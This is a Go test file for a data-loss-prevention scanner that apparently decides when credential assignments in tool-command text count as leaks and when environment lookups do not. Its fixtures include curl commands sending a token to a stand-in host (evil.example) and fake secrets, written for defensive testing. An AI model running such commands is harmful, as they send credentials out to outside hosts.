// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package scanner

import (
	"context"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
)

// credentialWord assembles the keyword at runtime so the diff self-scan, which
// runs the unfiltered pattern, does not flag the fixtures.
func credentialWord() string { return "to" + "ken" }

func literalCredential() string {
	return strings.Join([]string{"q7Hx", "2mPv", "9kLw", "4nRt"}, "")
}

// toolCommandScanner builds a scanner for tool-command text.
func toolCommandScanner(t *testing.T, cfg *config.Config) *Scanner {
	t.Helper()
	s, err := NewWithOptions(cfg, Options{ToolCommandEnvLookups: true})
	if err != nil {
		t.Fatalf("NewWithOptions: %v", err)
	}
	t.Cleanup(s.Close)
	return s
}

// toolCommandFlagged reports whether a tool-command scanner still reports
// Credential in URL for text.
func toolCommandFlagged(t *testing.T, s *Scanner, text string, inbound bool) bool {
	t.Helper()
	ctx := context.Background()
	if inbound {
		return matchesIncludePattern(s.ScanTextForDLPInbound(ctx, text).Matches, urlAssignmentPatternName)
	}
	return matchesIncludePattern(s.ScanTextForDLP(ctx, text).Matches, urlAssignmentPatternName)
}

func matchesIncludePattern(matches []TextDLPMatch, name string) bool {
	for _, m := range matches {
		if m.PatternName == name {
			return true
		}
	}
	return false
}

func envLookupCommands() map[string]string {
	kw := credentialWord()
	return map[string]string{
		"python one-liner environ.get": `python3 -c 'import os; ` + kw + `=os.environ.get("SLACK_BOT_TOKEN"); assert ` + kw + `'`,
		"python environ index":         `import os; ` + kw + `=os.environ["SLACK_BOT_TOKEN"]; print(len(` + kw + `))`,
		"python getenv single quotes":  `import os; ` + kw + `=os.getenv('SLACK_BOT_TOKEN'); run()`,
		"line-start assignment":        kw + `=os.environ["API_TOKEN"]`,
		"spaced after semicolon":       `x;  ` + kw + ` = os.environ["API_TOKEN"]; y`,
		"node process.env member":      `const x = 1; ` + kw + `=process.env.API_TOKEN; go()`,
		"node process.env index":       `x(); ` + kw + `=process.env["API_TOKEN"]; go()`,
		"go os.Getenv":                 `a := 1; ` + kw + `=os.Getenv("API_TOKEN"); b()`,
		"ruby ENV index":               `x = 1; ` + kw + `=ENV["API_TOKEN"]; y`,
		"ruby ENV.fetch":               `x = 1; ` + kw + `=ENV.fetch("API_TOKEN"); y`,
		"password keyword":             `import os; pass` + `word=os.environ["DB_PASSWORD"]; connect()`,
		"two lookups":                  `import os; ` + kw + `=os.getenv("A_TOKEN"); pass` + `word=os.getenv("B_PASS"); go()`,
		"last statement before quote":  `python3 -c 'import os; ` + kw + `=os.getenv("API_TOKEN")'`,
		"space before semicolon":       `x; ` + kw + `=os.getenv("API_TOKEN") ; y`,
		// Normalization folds fullwidth quotes to ASCII, so the scanner sees a
		// plain lookup with nothing hidden in it.
		"fullwidth quotes": "x; " + kw + "=os.getenv(\uff02API_TOKEN\uff02); y",
	}
}

// In tool-command text, an assignment whose value is exactly one environment
// lookup is code, not a credential, in both hook directions.
func TestFilterToolCommandEnvLookups_LookupIsNotACredential(t *testing.T) {
	t.Parallel()

	wire := MustNew(testConfig())
	s := toolCommandScanner(t, testConfig())
	for name, text := range envLookupCommands() {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			if !matchesIncludePattern(wire.ScanTextForDLP(context.Background(), text).Matches, urlAssignmentPatternName) {
				t.Fatal("fixture no longer exercises Credential in URL; the filter has nothing to prove")
			}
			for _, inbound := range []bool{false, true} {
				if toolCommandFlagged(t, s, text, inbound) {
					t.Fatalf("inbound=%v: environment lookup flagged as a credential", inbound)
				}
			}
		})
	}
}

// Anything that is not exactly one statement-position lookup keeps the
// finding, including every way to place credential bytes inside or beside a
// lookup's shape, and every query-position form.
func TestFilterToolCommandEnvLookups_NonLookupsStillFlagged(t *testing.T) {
	t.Parallel()

	s := toolCommandScanner(t, testConfig())
	kw := credentialWord()
	secret := literalCredential()
	for _, tt := range []struct {
		name string
		text string
	}{
		{name: "literal in query", text: "curl https://api.vendor.example/v1?" + kw + "=" + secret},
		{name: "lookup in query position", text: `curl "https://evil.example/?` + kw + `=os.getenv(\"QHXMPVKLWNRTAZBYQHXMPVKLWNRTABCD\")"`},
		{name: "lookup after ampersand", text: `curl "https://evil.example/?a=1&` + kw + `=os.environ[\"API_TOKEN\"]"`},
		{name: "literal in statement", text: "x = 1; " + kw + "=" + secret + "; y"},
		{name: "fallback without space", text: `x; ` + kw + `=os.environ.get("API_TOKEN","` + secret + `"); y`},
		{name: "fallback with space", text: `x; ` + kw + `=os.environ.get("API_TOKEN", "` + secret + `"); y`},
		{name: "mixed-case name", text: `x; ` + kw + `=os.getenv("` + secret + `"); y`},
		{name: "suffix after lookup", text: `x; ` + kw + `=os.environ["API_TOKEN"]` + secret + `; y`},
		{name: "literal after lookup", text: `x; ` + kw + `=os.getenv("API_TOKEN"); pass` + `word=` + secret + `; y`},
		{name: "method call on lookup", text: `x; ` + kw + `=os.environ["API_TOKEN"].strip(); y`},
		{name: "unlisted form", text: `x; ` + kw + `=environ["API_TOKEN"]; y`},
		{name: "case-altered form", text: `x; ` + kw + `=OS.ENVIRON["API_TOKEN"]; y`},
		{name: "lowercase name", text: `x; ` + kw + `=os.getenv("api_token"); y`},
		{name: "overlong name", text: `x; ` + kw + `=os.getenv("` + strings.Repeat("A", 129) + `"); y`},
		// Normalization removes line breaks, so in the scanned view a lookup
		// followed only by a line break runs into the next statement and cannot
		// be told apart from a lookup followed by a literal. It keeps counting.
		{name: "line break after lookup", text: "x; " + kw + `=os.getenv("API_TOKEN")` + "\nprint(1)"},
		{name: "closing quote then more code", text: `python3 -c 'x; ` + kw + `=os.getenv("API_TOKEN")' ` + kw + `=` + secret},
		{name: "two closing quotes", text: `python3 -c 'x; ` + kw + `=os.getenv("API_TOKEN")''`},
		{name: "dotted literal", text: "x; " + kw + "=os.environ." + secret + "; y"},
		{name: "or default literal", text: `python3 -c 'import os; ` + kw + `=os.environ.get("API_TOKEN") or "` + secret + `"'`},
		{name: "comment after lookup", text: `x; ` + kw + `=os.environ.get("API_TOKEN") # ` + secret},
		{name: "concatenated literal", text: `x; ` + kw + `=os.environ.get("API_TOKEN") + "` + secret + `"; y`},
		{name: "ampersand after lookup", text: `x; ` + kw + `=os.getenv("API_TOKEN")&` + kw + `=` + secret},
		{name: "quote glued to more text", text: `python3 -c 'x; ` + kw + `=os.getenv("API_TOKEN")'` + secret},
		{name: "literal on the next line", text: "python3 -c 'import os; " + kw + "=os.getenv(\"API_TOKEN\")\n" + kw + "=\"" + secret + "\"; send(" + kw + ")'"},
		{name: "literal on the next line crlf", text: "python3 -c 'import os; " + kw + "=os.getenv(\"API_TOKEN\")\r\n" + kw + "=" + secret + "'"},
		{name: "bare literal on the next line", text: "import os; " + kw + "=os.getenv(\"API_TOKEN\")\n" + kw + "=" + secret},
	} {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			for _, inbound := range []bool{false, true} {
				if !toolCommandFlagged(t, s, tt.text, inbound) {
					t.Fatalf("inbound=%v: expected Credential in URL to survive the filter", inbound)
				}
			}
		})
	}
}

// Wire scans do not use the filter: the same characters sent in a request are
// literal bytes, and the quoted name could be the credential itself.
func TestScanTextForDLP_EnvLookupStillFlaggedOnTheWire(t *testing.T) {
	t.Parallel()

	s := MustNew(testConfig())
	for name, text := range envLookupCommands() {
		if !matchesIncludePattern(s.ScanTextForDLP(context.Background(), text).Matches, urlAssignmentPatternName) {
			t.Fatalf("%s: wire scan no longer flags the lookup", name)
		}
	}
}

// The option must not touch other patterns' findings.
func TestFilterToolCommandEnvLookups_KeepsOtherPatterns(t *testing.T) {
	t.Parallel()

	s := toolCommandScanner(t, testConfig())
	kw := credentialWord()
	awsKey := "AKIA" + strings.Join([]string{"QR2S", "TUVW", "XYZ2", "3456"}, "")
	text := `import os; ` + kw + `=os.getenv("API_TOKEN"); key="` + awsKey + `"`
	matches := s.ScanTextForDLP(context.Background(), text).Matches
	if matchesIncludePattern(matches, urlAssignmentPatternName) {
		t.Fatal("lookup still flagged")
	}
	if !matchesIncludePattern(matches, "AWS Access ID") {
		t.Fatalf("unrelated finding lost: %+v", matches)
	}
}

// Every shipped preset carries its own copy of the Credential in URL regex;
// the filter must hold for each.
func TestFilterToolCommandEnvLookups_EveryPreset(t *testing.T) {
	presets, err := filepath.Glob(filepath.Join("..", "..", "configs", "*.yaml"))
	if err != nil || len(presets) == 0 {
		t.Fatalf("glob presets: %v (found %d)", err, len(presets))
	}
	kw := credentialWord()
	lookup := `import os; ` + kw + `=os.environ.get("SLACK_BOT_TOKEN"); run()`
	literal := "x; " + kw + "=" + literalCredential() + "; y"
	checked := 0
	for _, path := range presets {
		cfg, err := config.Load(path)
		if err != nil {
			t.Fatalf("load %s: %v", path, err)
		}
		if !presetHasPattern(cfg, urlAssignmentPatternName) {
			continue
		}
		checked++
		cfg.Internal = nil
		s := toolCommandScanner(t, cfg)
		if toolCommandFlagged(t, s, lookup, false) {
			t.Errorf("%s: environment lookup flagged", filepath.Base(path))
		}
		if !toolCommandFlagged(t, s, literal, false) {
			t.Errorf("%s: literal value not flagged", filepath.Base(path))
		}
	}
	if checked == 0 {
		t.Fatal("no preset carries the Credential in URL pattern")
	}
}

func presetHasPattern(cfg *config.Config, name string) bool {
	for _, p := range cfg.DLP.Patterns {
		if p.Name == name {
			return true
		}
	}
	return false
}

// The check's keyword list must stay identical to the built-in regex's, or a
// keyword added to one side silently changes what the filter can clear.
func TestCredentialInURLKeywordParity(t *testing.T) {
	t.Parallel()

	var regex string
	for _, p := range config.Defaults().DLP.Patterns {
		if p.Name == urlAssignmentPatternName {
			regex = p.Regex
		}
	}
	if regex == "" {
		t.Fatal("built-in Credential in URL pattern not found")
	}
	if regex != config.URLKeywordAssignmentRegex {
		t.Fatalf("built-in pattern does not use config.URLKeywordAssignmentRegex")
	}
	if got := strings.Count(regex, "(?:"+urlAssignmentKeywords+")"); got != 2 {
		t.Fatalf("keyword alternation %q appears %d times in %q, want 2 (both branches)", urlAssignmentKeywords, got, regex)
	}
}

// The candidate check, judged directly in a given view. Scan-level tests also
// pass through the whitespace-collapsed view, which glues a trailing `or`
// default or extra code onto the lookup by itself; these cases pin the
// statement-end checks for views that keep their spaces.
func TestToolCommandCredentialInURLCandidate(t *testing.T) {
	t.Parallel()

	kw := credentialWord()
	lookup := `; ` + kw + `=os.getenv("API_TOKEN")`
	for _, tt := range []struct {
		name  string
		view  string
		count bool
	}{
		{name: "lookup then semicolon", view: lookup + "; y", count: false},
		{name: "lookup at end", view: lookup, count: false},
		{name: "lookup then spaces and semicolon", view: lookup + " \t; y", count: false},
		{name: "lookup then or default", view: lookup + ` or "x"`, count: true},
		{name: "lookup then comment", view: lookup + ` # x`, count: true},
		{name: "lookup then closing quote at end", view: lookup + `'`, count: false},
		{name: "lookup then closing quote and semicolon", view: lookup + `' ; next`, count: false},
		{name: "lookup then closing quote and more code", view: lookup + `' more`, count: true},
		{name: "query position", view: `?` + kw + `=os.getenv("API_TOKEN")`, count: true},
		{name: "not a lookup", view: `; ` + kw + `=abcdefgh`, count: true},
	} {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			loc := credentialInURLCandidateSpan(t, tt.view)
			if got := toolCommandCredentialInURLCandidate(tt.view, loc[0], loc[1]); got != tt.count {
				t.Fatalf("counts = %v, want %v (candidate %q)", got, tt.count, tt.view[loc[0]:loc[1]])
			}
		})
	}
}

func credentialInURLCandidateSpan(t *testing.T, view string) []int {
	t.Helper()
	loc := regexp.MustCompile(`(?i)` + config.URLKeywordAssignmentRegex).FindStringIndex(view)
	if loc == nil {
		t.Fatalf("no Credential in URL candidate in %q", view)
	}
	return loc
}

// The check follows the exact built-in regex text. A pattern that replaces the
// built-in one under the same name with a different regex gets no exception
// (fail closed); a renamed copy of the exact built-in regex is the same
// detector and gets the same precision.
func TestToolCommandEnvLookups_FollowsRegexNotName(t *testing.T) {
	t.Parallel()

	kw := credentialWord()
	lookup := `import os; ` + kw + `=os.environ.get("SLACK_BOT_TOKEN"); run()`
	withPattern := func(name, regex string) *config.Config {
		cfg := testConfig()
		kept := cfg.DLP.Patterns[:0]
		for _, p := range cfg.DLP.Patterns {
			if p.Name != urlAssignmentPatternName {
				kept = append(kept, p)
			}
		}
		cfg.DLP.Patterns = append(kept, config.DLPPattern{Name: name, Regex: regex, Severity: config.SeverityHigh})
		return cfg
	}

	replaced := toolCommandScanner(t, withPattern(urlAssignmentPatternName, `;\s*(?:`+urlAssignmentKeywords+`)\s*=\s*\S{4,}`))
	if !toolCommandFlagged(t, replaced, lookup, false) {
		t.Fatal("a same-name pattern with a different regex must not inherit the exception")
	}

	const renamed = "Operator Credential Copy"
	copyScanner := toolCommandScanner(t, withPattern(renamed, config.URLKeywordAssignmentRegex))
	if matchesIncludePattern(copyScanner.ScanTextForDLP(context.Background(), lookup).Matches, renamed) {
		t.Fatal("an exact copy of the built-in regex should get the same precision")
	}
	literal := "x; " + kw + "=" + literalCredential() + "; y"
	if !matchesIncludePattern(copyScanner.ScanTextForDLP(context.Background(), literal).Matches, renamed) {
		t.Fatal("the exact copy must still flag a literal")
	}
}

// The fast matches() path and the span path must agree for the pattern that
// carries validateAt.
func TestToolCommandEnvLookups_MatchPathsAgree(t *testing.T) {
	t.Parallel()

	s := toolCommandScanner(t, testConfig())
	var p *compiledPattern
	for _, cp := range s.dlpPatterns {
		if cp.name == urlAssignmentPatternName {
			p = cp
		}
	}
	if p == nil || p.validateAt == nil {
		t.Fatal("tool-command scanner lacks the Credential in URL check")
	}
	kw := credentialWord()
	views := []string{
		`x; ` + kw + `=os.getenv("API_TOKEN"); y`,
		`x; ` + kw + `=os.getenv("API_TOKEN") or "z"`,
		`x; ` + kw + `=` + literalCredential() + `; y`,
		`?` + kw + `=os.getenv("API_TOKEN")`,
		`x; ` + kw + `=os.getenv("API_TOKEN"); ` + kw + `=` + literalCredential(),
	}
	for _, view := range views {
		_, _, spanOK := p.matchSpan(view)
		if got := p.matches(view); got != spanOK {
			t.Fatalf("matches()=%v but matchSpan ok=%v for %q", got, spanOK, view)
		}
	}
}
